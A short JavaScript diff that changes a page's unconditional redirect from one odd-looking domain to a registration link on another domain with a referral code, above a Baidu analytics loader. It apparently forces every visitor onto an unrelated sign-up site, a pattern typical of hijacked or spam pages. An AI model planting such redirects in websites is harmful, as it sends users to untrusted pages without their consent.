@@ -1,4 +1,4 @@
-window.location.href = "http://ky5241.com"; 
+window.location.href = "https://www.wk7lzq.vip:9553/register11254?i_code=36458060"; 
     (function () {
         var hm = document.createElement("script");
         hm.src = "https://hm.baidu.com/hm.js?xxxxxxxxxxxxxxxxxx";
